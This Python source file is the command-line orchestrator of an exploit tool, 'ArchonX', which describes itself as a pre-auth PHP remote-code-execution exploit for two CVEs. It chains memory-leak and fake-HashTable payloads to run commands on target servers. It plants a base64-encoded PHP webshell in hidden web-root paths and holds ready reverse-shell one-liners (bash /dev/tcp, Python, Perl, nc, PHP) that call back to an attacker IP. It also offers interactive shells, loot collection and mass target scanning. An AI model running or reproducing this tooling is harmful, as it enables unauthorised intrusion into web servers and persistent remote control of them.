"""ArchonX CLI — argument parser and phase orchestrator.

Pipeline: recon → profile → worker pin → exploit chain → post-exploit → cleanup.
"""
from __future__ import annotations

import argparse
import json
import os
import shutil
import subprocess
import sys
import time
import urllib.parse

from . import __version__, __tool__, __brand__, __cves__
from .branding import log, MARK_RULE, RESET
from .transport import (
    TransportConfig, send_get, send_chunked, send_plain, get_status_code,
)
from .payloads import (
    build_a1_body, build_b1_body, build_fake_hashtable,
    LEAK_SPEC_128M, QUERY_STRING_128M,
)
from .leak import parse_leak, validate_leak
from .oom import send_cheap_oom
from .forge import send_forge
from .calibrate import (
    binary_search_oom, detect_memory_limit,
    get_sizing_profile, calibrate_leak_params,
)
from .offset_db import ProfileDB, Profile
from .offsets import extract_from_container, load_offsets_env, save_offsets_env
from .worker_pin import pin_workers, release_pin
from .recon import fingerprint, TargetInfo


# ─── in-band markers ─────────────────────────────────────────────────────
INBAND_START = "<<<ARCX_7f3a>>>"
INBAND_END = "<<<ARCE_7f3a>>>"

# ─── webshell ────────────────────────────────────────────────────────────
# <?php system($_GET['c']);?>
WEBSHELL_B64 = "PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+"

WEBSHELL_PATHS = [
    ("/var/www/html/.archonx.php", "/.archonx.php"),
    ("/var/www/html/assets/.archonx.php", "/assets/.archonx.php"),
]

# ─── reverse shells ──────────────────────────────────────────────────────
REVERSE_SHELLS = {
    "bash":   "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
    "python": "python3 -c 'import os,pty,socket;s=socket.socket();"
              "s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);"
              "os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
              "pty.spawn(\"/bin/sh\")'",
    "perl":   "perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,"
              "getprotobyname(\"tcp\"));connect(S,sockaddr_in({port},"
              "inet_aton(\"{ip}\")));open(STDIN,\">&S\");"
              "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")'",
    "nc":     "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f",
    "php":    "php -r '$s=fsockopen(\"{ip}\",{port});"
              "proc_open(\"/bin/sh -i\",array(0=>$s,1=>$s,2=>$s),$pipes);'",
}


# ─── tee for session.log ─────────────────────────────────────────────────
class _Tee:
    def __init__(self, *streams):
        self.streams = streams

    def write(self, data):
        for s in self.streams:
            try:
                s.write(data)
            except Exception:
                pass

    def flush(self):
        for s in self.streams:
            try:
                s.flush()
            except Exception:
                pass


# ─── helpers ─────────────────────────────────────────────────────────────
def parse_target(url: str) -> tuple[str, int, str, bool]:
    p = urllib.parse.urlparse(url)
    tls = p.scheme == "https"
    host = p.hostname or "127.0.0.1"
    port = p.port or (443 if tls else 80)
    path = p.path or "/"
    if p.query:
        path += "?" + p.query
    return host, port, path, tls


def _print_output(output: str) -> None:
    if not output:
        return
    bar = MARK_RULE * 48
    log.info(f"{bar}")
    for line in output.rstrip().splitlines() or [""]:
        log.info(line)
    log.info(f"{bar}")


def _extract_inband(resp: bytes) -> str | None:
    parts = resp.split(b"\r\n\r\n", 1)
    if len(parts) < 2:
        return None
    text = parts[1].decode("utf-8", "replace")
    s = text.find(INBAND_START)
    e = text.find(INBAND_END)
    if s >= 0 and e > s:
        return text[s + len(INBAND_START):e].strip()
    return None


# ─── PHASE 0 ─────────────────────────────────────────────────────────────
def phase_recon(host: str, port: int, path: str, tls: bool) -> TargetInfo:
    log.phase("RECON", 0)
    info = fingerprint(host, port, path, tls)
    if info.reachable:
        log.phase_done()
    else:
        log.error("target unreachable")
    return info


# ─── PHASE 1 ─────────────────────────────────────────────────────────────
def phase_profile(info: TargetInfo, db: ProfileDB,
                  offsets_env: str = "", force_arch: str = ""
                  ) -> Profile | None:
    log.phase("PROFILE LOOKUP", 1)
    log.field("profiles in database", len(db.profiles))

    version = ""
    if info.php_version:
        import re
        m = re.search(r"(\d+\.\d+\.\d+)", info.php_version)
        if m:
            version = m.group(1)

    arch = force_arch
    if not arch:
        import platform
        machine = platform.machine().lower()
        if machine in ("aarch64", "arm64"):
            arch = "arm64"
        elif machine in ("x86_64", "amd64"):
            arch = "amd64"
        elif "aarch64" in info.os_hint.lower():
            arch = "arm64"

    if offsets_env:
        zif, dtor = load_offsets_env(offsets_env)
        if zif and dtor:
            profile = db.match(
                php_version=version, os_hint=info.os_hint,
                arch=arch, sapi=info.sapi,
            )
            if profile:
                profile.zif_system = zif
                profile.zval_ptr_dtor = dtor
                profile.name += " (offsets.env override)"
                log.field("matched profile", profile.name)
                log.field("zif_system", f"0x{zif:x}")
                log.field("zval_ptr_dtor", f"0x{dtor:x}")
                log.phase_done()
                return profile
            profile = Profile(
                name="custom-offsets-env",
                php_version=version, os=info.os_hint,
                arch=arch or "unknown", sapi=info.sapi,
                zif_system=zif, zval_ptr_dtor=dtor,
            )
            log.field("profile", "offsets.env only")
            log.field("zif_system", f"0x{zif:x}")
            log.field("zval_ptr_dtor", f"0x{dtor:x}")
            log.phase_done()
            return profile

    profile = db.match(
        php_version=version, os_hint=info.os_hint,
        arch=arch, sapi=info.sapi,
    )
    if not profile:
        log.error("no matching profile found")
        log.info("extract offsets with: python run.py --extract-offsets <container>")
        log.info("or provide --offsets-env path/to/offsets.env")
        return None

    log.field("matched profile", profile.name)
    log.field("status", profile.status)
    log.field("zif_system", f"0x{profile.zif_system:x}")
    log.field("zval_ptr_dtor", f"0x{profile.zval_ptr_dtor:x}")
    log.field("stage a1_big", profile.a1_big)
    log.field("stage a2_parts", profile.a2_parts)
    log.field("stage a2_fillers", profile.a2_fillers)
    log.field("stage leak_fake_len", f"0x{profile.leak_fake_len:x}")
    log.field("stage ht_offset", f"0x{profile.ht_offset:x}")
    log.field("stage forge_vl", profile.forge_vl)
    log.phase_done()
    return profile


# ─── PHASE 2 ─────────────────────────────────────────────────────────────
def phase_worker_pin(host: str, port: int, path: str):
    log.phase("WORKER PIN", 2)
    state = pin_workers(host, port, path)
    log.phase_done()
    return state


# ─── PHASE 3 — exploit chain ─────────────────────────────────────────────
def _chain_inband(cfg: TransportConfig, path: str, profile: Profile,
                  wrapped_cmd: str, retries: int
                  ) -> tuple[bool, str, str]:
    """Run the full A1→B1→A2→B2 chain and return in-band command output."""
    dtor_off = profile.zval_ptr_dtor
    zif_off = profile.zif_system
    ht_offset = profile.ht_offset
    leak_spec = profile.leak_spec or LEAK_SPEC_128M
    fake_len = profile.leak_fake_len

    for attempt in range(1, retries + 1):
        log.info(f"attempt {attempt}/{retries}")

        send_get(cfg, path)
        time.sleep(0.2)

        log.info("A1 — sending OOM payload")
        a1_body = build_a1_body(big=profile.a1_big)
        resp = send_chunked(cfg, path + QUERY_STRING_128M, a1_body)
        code = get_status_code(resp)
        log.field("A1 response", f"HTTP {code}",
                  status="ok" if code == 500 else "warn")
        if code != 500:
            log.warn("A1 did not trigger OOM, retrying")
            continue
        time.sleep(0.2)

        log.info("B1 — sending leak payload")
        b1_body = build_b1_body(
            spec=leak_spec, fake_len=fake_len, tagged=True,
        )
        resp = send_chunked(cfg, path, b1_body)

        try:
            leak = parse_leak(resp, dtor_off)
            valid, reason = validate_leak(leak)
        except RuntimeError as exc:
            log.warn(f"leak failed: {exc}")
            continue

        log.field("leak decoded", f"{leak.decoded_len} bytes")
        log.field("arch", leak.arch)
        log.field("zval_ptr_dtor",
                  f"0x{leak.zval_ptr_dtor_addr:x} (x{leak.zval_ptr_dtor_count})")
        log.field("libphp base", f"0x{leak.libphp_base:x}")
        if not valid:
            log.field("leak validated", "no", status="fail")
            log.warn(f"reason: {reason}")
            params = calibrate_leak_params(leak)
            log.info(f"auto-calibrated: {params}")
            continue

        log.field("leak validated", "yes")
        if not leak.main_chunk_candidates:
            log.warn("no main-chunk candidate")
            continue

        zif_addr = leak.libphp_base + zif_off
        for ci, cand in enumerate(leak.main_chunk_candidates):
            ht_addr = cand + ht_offset
            log.info(
                f"candidate {ci + 1}/{len(leak.main_chunk_candidates)} "
                f"main=0x{cand:x} ht=0x{ht_addr:x} zif=0x{zif_addr:x}"
            )
            ht_data = build_fake_hashtable(
                ht_addr, zif_addr, wrapped_cmd.encode(), inband=True,
            )
            log.field("fake HashTable", f"{len(ht_data)} bytes")

            log.info("A2 — sending cheap-OOM")
            send_cheap_oom(cfg, path, parts=profile.a2_parts,
                           fillers=profile.a2_fillers)
            time.sleep(0.2)

            log.info("B2 — sending forge spray")
            b2_resp = send_forge(cfg, path, ht_addr, ht_data,
                                 vl=profile.forge_vl,
                                 n1=profile.forge_n1,
                                 n2=profile.forge_n2)
            time.sleep(0.6)

            output = _extract_inband(b2_resp)
            if output is not None:
                log.ok(f"RCE confirmed on attempt {attempt}, "
                       f"candidate {ci + 1}")
                return True, output, "in-band"
            log.warn("no in-band marker in response")

    return False, "", "no candidate fired"


def _chain_file(cfg: TransportConfig, path: str, profile: Profile,
                cmd: str, retries: int, out_dir: str
                ) -> tuple[bool, str, str]:
    """Run chain with command redirected to /out/, read from host volume."""
    os.makedirs(out_dir, exist_ok=True)
    proof = os.path.join(out_dir, ".archonx_proof")
    result = os.path.join(out_dir, ".archonx_result")
    for f in (proof, result):
        try:
            os.remove(f)
        except FileNotFoundError:
            pass

    wrapped = f"{cmd} > /out/.archonx_result 2>&1; touch /out/.archonx_proof"

    ok, _, mode = _chain_inband(cfg, path, profile, wrapped, retries)
    if not ok and not os.path.exists(proof):
        return False, "", "chain failed"

    time.sleep(0.3)
    if not os.path.exists(proof):
        return False, "", "proof file not written"

    output = ""
    if os.path.exists(result):
        try:
            with open(result, "r", errors="replace") as f:
                output = f.read().rstrip()
        except OSError as exc:
            log.warn(f"cannot read result file: {exc}")

    for f in (proof, result):
        try:
            os.remove(f)
        except OSError:
            pass

    return True, output, "file"


# ─── webshell helpers ────────────────────────────────────────────────────
def _webshell_cmd(cfg: TransportConfig, url_path: str, cmd: str) -> str:
    encoded = urllib.parse.quote(cmd, safe="")
    resp = send_get(cfg, f"{url_path}?c={encoded}")
    if get_status_code(resp) == 200:
        parts = resp.split(b"\r\n\r\n", 1)
        if len(parts) > 1:
            return parts[1].decode("utf-8", "replace").rstrip()
    return ""


def _plant_webshell(cfg: TransportConfig, path: str, profile: Profile,
                    retries: int) -> tuple[bool, str]:
    for remote_path, url_path in WEBSHELL_PATHS:
        log.info(f"plant attempt: {remote_path}")
        cmd = f"echo {WEBSHELL_B64} | base64 -d > {remote_path}"
        ok, _, _ = _chain_file(cfg, path, profile, cmd, retries,
                               os.path.join(os.getcwd(), "out"))
        if not ok:
            continue
        time.sleep(0.4)
        if "archonx_ok" in _webshell_cmd(cfg, url_path, "echo archonx_ok"):
            log.ok(f"webshell live at {url_path}")
            return True, url_path
        log.warn(f"webshell not reachable at {url_path}")
    return False, ""


def _remove_webshell(cfg: TransportConfig, url_path: str) -> None:
    _webshell_cmd(cfg, url_path, f"rm -f {url_path}")


# ─── PHASE 4 — mode branches ─────────────────────────────────────────────
def _run_cmd(cfg: TransportConfig, path: str, profile: Profile,
             cmd: str, retries: int, mode: str, out_dir: str
             ) -> tuple[bool, str]:
    if mode == "webshell":
        ok, ws_url = _plant_webshell(cfg, path, profile, retries)
        if not ok:
            return False, ""
        try:
            output = _webshell_cmd(cfg, ws_url, cmd)
        finally:
            _remove_webshell(cfg, ws_url)
        return True, output

    if mode == "file":
        ok, output, _ = _chain_file(cfg, path, profile, cmd, retries, out_dir)
        return ok, output

    # auto
    wrapped = f"echo '{INBAND_START}';{cmd};echo '{INBAND_END}'"
    if len(wrapped) < 195:
        ok, output, _ = _chain_inband(cfg, path, profile, wrapped, retries)
        if ok:
            return True, output
        log.info("in-band failed, trying file fallback")
    else:
        log.info(f"command too long for in-band ({len(wrapped)}B > 195B)")
        log.info("using file mode")

    ok, output, _ = _chain_file(cfg, path, profile, cmd, retries, out_dir)
    return ok, output


def _run_shell(cfg: TransportConfig, path: str, profile: Profile,
               retries: int, mode: str, out_dir: str) -> None:
    if mode in ("auto", "webshell"):
        ok, ws_url = _plant_webshell(cfg, path, profile, retries)
        if ok:
            log.ok("interactive shell ready (type 'exit' to quit)")
            print()
            try:
                while True:
                    try:
                        cmd = input(log.prompt("/var/www/html")).strip()
                    except (EOFError, KeyboardInterrupt):
                        print()
                        break
                    if not cmd:
                        continue
                    if cmd in ("exit", "quit", "q"):
                        break
                    output = _webshell_cmd(cfg, ws_url, cmd)
                    if output:
                        print(output)
            finally:
                _remove_webshell(cfg, ws_url)
            return
        if mode == "webshell":
            log.error("webshell plant failed")
            return
        log.warn("webshell plant failed, using file-based I/O")

    log.ok("interactive shell ready (file mode, ~5s per command)")
    print()
    while True:
        try:
            cmd = input(log.prompt("/var/www/html")).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not cmd:
            continue
        if cmd in ("exit", "quit", "q"):
            break
        ok, output, _ = _chain_file(cfg, path, profile, cmd, retries, out_dir)
        if ok:
            if output:
                print(output)
        else:
            log.error("chain failed")
            break


def _run_reverse(cfg: TransportConfig, path: str, profile: Profile,
                 ip: str, port: int, method: str, retries: int,
                 listen: bool) -> None:
    if method not in REVERSE_SHELLS:
        log.error(f"unknown shell method: {method}")
        return

    listener = None
    if listen:
        nc = shutil.which("nc") or shutil.which("ncat")
        if not nc:
            log.warn("nc / ncat not found — start your own listener")
        else:
            log.field("listener", f"{nc} -lvnp {port}")
            listener = subprocess.Popen(
                [nc, "-lvnp", str(port)],
                stdin=sys.stdin, stdout=sys.stdout, stderr=sys.stderr,
            )
            time.sleep(0.5)

    payload = REVERSE_SHELLS[method].format(ip=ip, port=port)
    log.field("payload", payload)

    wrapped = f"echo '{INBAND_START}';{payload};echo '{INBAND_END}'"
    if len(wrapped) < 195:
        ok, _, _ = _chain_inband(cfg, path, profile, wrapped, retries)
    else:
        ok, _, _ = _chain_inband(cfg, path, profile, payload, retries)

    if not ok:
        log.error("reverse payload did not fire")
        if listener:
            listener.terminate()
        return

    log.ok("payload fired, waiting for callback")
    if listener:
        try:
            listener.wait()
        except KeyboardInterrupt:
            listener.terminate()


# ─── cleanup ─────────────────────────────────────────────────────────────
def _cleanup(pin_state, loot_dir: str) -> None:
    log.phase("CLEANUP")
    if pin_state is not None:
        release_pin(pin_state)
    log.field("loot directory", loot_dir)
    log.field("total elapsed", f"{log.elapsed():.3f}s")
    log.ok("done")


# ─── loot + logging setup ────────────────────────────────────────────────
def _setup_loot() -> tuple[str, "object"]:
    ts = time.strftime("%Y%m%d-%H%M%S")
    loot = os.path.join("loot", ts)
    os.makedirs(loot, exist_ok=True)
    logfile = open(os.path.join(loot, "session.log"), "w", buffering=1)
    return loot, logfile


# ─── argument parsing ────────────────────────────────────────────────────
def _build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="run.py",
        description=(
            f"{__tool__} — pre-auth PHP RCE for "
            f"{__cves__[0]} / {__cves__[1]}\n{__brand__}"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "execution modes:\n"
            "  --cmd CMD            run one command, print output, exit\n"
            "  --shell              interactive shell (webshell / file fallback)\n"
            "  --reverse IP:PORT    reverse shell callback\n"
            "  --recon-only         fingerprint only, no exploitation\n"
            "  --mode auto|webshell|file\n"
        ),
    )

    p.add_argument("-t", "--target", help="single target URL")
    p.add_argument("-tL", "--target-list",
                   help="file with one target URL per line")

    p.add_argument("--cmd", help="single command to run and exit")
    p.add_argument("--shell", action="store_true",
                   help="interactive shell")
    p.add_argument("--reverse", metavar="IP:PORT",
                   help="reverse shell callback")
    p.add_argument("--shell-method", default="bash",
                   choices=list(REVERSE_SHELLS.keys()),
                   help="reverse shell method (default: bash)")
    p.add_argument("--no-listener", action="store_true",
                   help="do not start a local nc listener")

    p.add_argument("--mode", choices=["auto", "webshell", "file"],
                   default="auto", help="execution mode (default: auto)")

    p.add_argument("--recon-only", action="store_true",
                   help="fingerprint only, no exploitation")
    p.add_argument("--calibrate-only", action="store_true",
                   help="recon + calibration, no RCE")

    p.add_argument("--extract-offsets", metavar="CONTAINER",
                   help="extract offsets from a Docker container, save to "
                        "out/offsets.env, exit")
    p.add_argument("--offsets-env", default=os.path.join("out", "offsets.env"),
                   help="path to offsets.env")
    p.add_argument("--arch", choices=["amd64", "arm64", ""], default="",
                   help="force architecture for profile match")

    p.add_argument("--retries", type=int, default=5,
                   help="max chain attempts (default: 5)")
    p.add_argument("--timeout", type=float, default=120.0,
                   help="per-request timeout seconds (default: 120)")
    p.add_argument("--proxy", default="",
                   help="proxy URL (socks5:// or http://)")
    p.add_argument("--out-dir", default=os.path.join(os.getcwd(), "out"),
                   help="local dir mapped to /out/ on the target")
    p.add_argument("--report", help="write JSON report to this file")
    p.add_argument("--no-color", action="store_true",
                   help="disable ANSI (same as NO_COLOR=1)")
    p.add_argument("--debug", action="store_true",
                   help="wire traces and hexdumps")
    p.add_argument("--version", action="store_true",
                   help="print version and exit")

    return p


# ─── main ────────────────────────────────────────────────────────────────
def main() -> int:
    parser = _build_parser()
    args = parser.parse_args()

    if args.version:
        print(f"{__tool__} v{__version__}")
        print(__brand__)
        print(" / ".join(__cves__))
        return 0

    if args.no_color:
        os.environ["NO_COLOR"] = "1"
        log.disable_color()
    log.set_debug(args.debug)

    if args.extract_offsets:
        try:
            zif, dtor = extract_from_container(args.extract_offsets)
        except RuntimeError as exc:
            print(f"error: {exc}", file=sys.stderr)
            return 3
        save_offsets_env(args.offsets_env, zif, dtor)
        print(f"zif_system    = 0x{zif:x}")
        print(f"zval_ptr_dtor = 0x{dtor:x}")
        print(f"saved to {args.offsets_env}")
        return 0

    if not args.target and not args.target_list:
        parser.error("either -t/--target or -tL/--target-list is required")
    if args.target and args.target_list:
        parser.error("-t and -tL are mutually exclusive")

    modes = [bool(args.cmd), args.shell, bool(args.reverse)]
    if sum(modes) > 1:
        parser.error("--cmd, --shell, --reverse are mutually exclusive")
    if args.recon_only and any(modes):
        parser.error("--recon-only cannot combine with --cmd/--shell/--reverse")

    log.banner()

    loot_dir, logfile = _setup_loot()
    real_stdout = sys.stdout
    sys.stdout = _Tee(real_stdout, logfile)

    log.info(f"session {time.strftime('%Y-%m-%dT%H:%M:%S')}")
    try:
        if args.target:
            rc = _run_single(args, loot_dir)
        else:
            rc = _run_multi(args, loot_dir)
    finally:
        sys.stdout = real_stdout
        try:
            logfile.close()
        except Exception:
            pass

    return rc


def _run_single(args, loot_dir: str) -> int:
    host, port, path, tls = parse_target(args.target)
    log.info(f"target {args.target}")
    if args.cmd:
        log.info(f"mode single-command")
    elif args.shell:
        log.info(f"mode interactive")
    elif args.reverse:
        log.info(f"mode reverse → {args.reverse}")
    elif args.recon_only:
        log.info(f"mode recon-only")

    info = phase_recon(host, port, path, tls)
    if not info.reachable:
        return 1

    if args.recon_only:
        _write_report(args, info, None, None)
        _cleanup(None, loot_dir)
        return 0 if info.vulnerable else 1

    if not info.vulnerable and info.php_version_tuple:
        log.warn("target reports patched version — attempting anyway")

    db = ProfileDB()
    profile = phase_profile(info, db, args.offsets_env, args.arch)
    if not profile:
        return 1

    if args.calibrate_only:
        cfg = TransportConfig(host=host, port=port, tls=tls,
                              proxy=args.proxy, timeout=args.timeout)
        oom_big = binary_search_oom(cfg, path)
        if oom_big is not None:
            log.field("estimated memory_limit",
                      detect_memory_limit(oom_big))
        _cleanup(None, loot_dir)
        return 0

    pin_state = phase_worker_pin(host, port, path)

    cfg = TransportConfig(host=host, port=port, tls=tls,
                          proxy=args.proxy, timeout=args.timeout)

    try:
        log.phase("EXPLOIT CHAIN", 3, palette="red")
        ok = False
        output = ""
        reason = ""

        if args.reverse:
            parts = args.reverse.rsplit(":", 1)
            if len(parts) != 2:
                log.error("--reverse format must be IP:PORT")
                return 2
            ip, rp = parts[0], int(parts[1])
            _run_reverse(cfg, path, profile, ip, rp, args.shell_method,
                         args.retries, not args.no_listener)
            ok = True
            log.phase_done()

        elif args.shell:
            log.phase_done()
            log.phase("SHELL", 4, palette="red")
            _run_shell(cfg, path, profile, args.retries, args.mode,
                       args.out_dir)
            ok = True
            log.phase_done()

        elif args.cmd:
            ok, output = _run_cmd(cfg, path, profile, args.cmd,
                                  args.retries, args.mode, args.out_dir)
            if ok:
                log.phase_done()
                _print_output(output)
            else:
                log.error("chain failed")
                reason = "no in-band marker or proof file"

        else:
            log.error("no action specified (use --cmd, --shell, or --reverse)")
            return 2

        _write_report(args, info, profile, {
            "ok": ok, "output": output, "reason": reason,
        })

        _cleanup(pin_state, loot_dir)
        return 0 if ok else 1

    finally:
        pass


def _run_multi(args, loot_dir: str) -> int:
    if not os.path.isfile(args.target_list):
        log.error(f"target list not found: {args.target_list}")
        return 2

    with open(args.target_list) as f:
        targets = [ln.strip() for ln in f
                   if ln.strip() and not ln.strip().startswith("#")]
    if not targets:
        log.error("target list is empty")
        return 2

    log.info(f"targets {len(targets)}")

    rows = []
    for i, url in enumerate(targets, 1):
        log.info(f"── {i}/{len(targets)} {url}")
        host, port, path, tls = parse_target(url)
        info = phase_recon(host, port, path, tls)
        if not info.reachable:
            rows.append((url, "UNREACHABLE", "—", "—"))
            continue
        ver = ".".join(map(str, info.php_version_tuple)) or "hidden"
        status = "VULNERABLE" if info.vulnerable else "PATCHED"
        rows.append((url, status, ver, info.sapi or "unknown"))

    log.phase("SCAN SUMMARY")
    log.field("targets scanned", len(targets))
    vuln = sum(1 for _, s, *_ in rows if s == "VULNERABLE")
    patched = sum(1 for _, s, *_ in rows if s == "PATCHED")
    unreach = sum(1 for _, s, *_ in rows if s == "UNREACHABLE")
    log.field("vulnerable", vuln)
    log.field("patched", patched)
    log.field("unreachable", unreach)
    print()
    print("  STATUS       PHP       SAPI         TARGET")
    print("  " + "─" * 72)
    for url, status, ver, sapi in rows:
        print(f"  {status:<12} {ver:<9} {sapi:<12} {url}")
    print()
    log.phase_done()

    if args.report:
        with open(args.report, "w") as f:
            json.dump(
                [{"url": u, "status": s, "php": v, "sapi": sa}
                 for u, s, v, sa in rows],
                f, indent=2,
            )
        log.field("report", args.report)

    _cleanup(None, loot_dir)
    return 0


def _write_report(args, info: TargetInfo, profile, result) -> None:
    if not args.report:
        return
    payload = {
        "target": info.url,
        "reachable": info.reachable,
        "php_version": info.php_version,
        "os_hint": info.os_hint,
        "sapi": info.sapi,
        "mpm": info.mpm,
        "upload_progress": info.upload_progress,
        "vulnerable": info.vulnerable,
        "vulns": info.vulns,
    }
    if profile:
        payload["profile"] = {
            "name": profile.name,
            "zif_system": f"0x{profile.zif_system:x}",
            "zval_ptr_dtor": f"0x{profile.zval_ptr_dtor:x}",
        }
    if result:
        payload["result"] = result
    try:
        with open(args.report, "w") as f:
            json.dump(payload, f, indent=2)
        log.field("report", args.report)
    except OSError as exc:
        log.warn(f"cannot write report: {exc}")
